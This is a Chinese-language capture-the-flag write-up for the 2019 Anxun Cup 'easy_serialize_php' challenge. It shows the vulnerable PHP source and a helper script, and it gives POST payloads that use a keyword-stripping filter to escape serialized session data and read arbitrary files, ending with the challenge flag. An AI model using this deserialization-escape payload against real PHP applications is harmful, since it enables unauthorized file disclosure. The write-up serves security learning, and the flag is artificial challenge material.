#安洵杯 2019]easy_serialize_php

代码审计
```
<?php

$function = @$_GET['f'];

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
} #对$img里面的php,flag,php5,php4,fl1g进行过滤


if($_SESSION){
    unset($_SESSION);
} #将已有的session删除掉

$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function; #给名为user和function的session赋值

extract($_POST); #用POST提交的方式叫html表单

if(!$function){
    echo '<a href="index.php?f=highlight_file">source_code</a>';
}

if(!$_GET['img_path']){
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
} #如果没有img_path这个变量，则给guset_img.png加密，有，则给img_path加密

$serialize_info = filter(serialize($_SESSION)); #将$_SESSION序列化的值给filter过滤

if($function == 'highlight_file'){
    highlight_file('index.php');
} #如果变量是highlight_file，则显示index.php
else if($function == 'phpinfo'){
    eval('phpinfo();'); //maybe you can find something in here!
} #如果变量是phpinfo，则显示php信息
else if($function == 'show_image'){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo['img'])); #如果变量是show_image，则显示$img变量里的文件里的内容

```

通过观察php的信息，可以看到一个文件信息d0g3_flag.php

但是我们无法读取这个文件的内容，然后通过代码审计，我们可以使用反序列化逃逸，通过改变img的值来读取

可以通过exp来知道原来_SESSION序列化的值
```
<?php

$function=@$_GET['f'];

$_SESSION["user"]='guest';
$_SESSION['function']=$function;
$_SESSION['img']=base64_encode('guest_img.png');

extract($_POST);

$serialize_info=serialize($_SESSION);

echo $serialize_info;
?>
```

此时输出的是：
a:3:{s:4:"user";s:5:"guest";s:8:"function";N;s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}

我们可以通过减少关键词的数来逃逸
_SESSION[flagflag]=";s:3:"aaa";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}

我们可以得到
$flag = 'flag in /d0g3_fllllllag';

然后我们再改变一下img的数值
_SESSION[flagflag]=";s:3:"aaa";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}

从而得到flag
flag{7b704900-c0d7-4302-90a6-fc459a2c405c} 

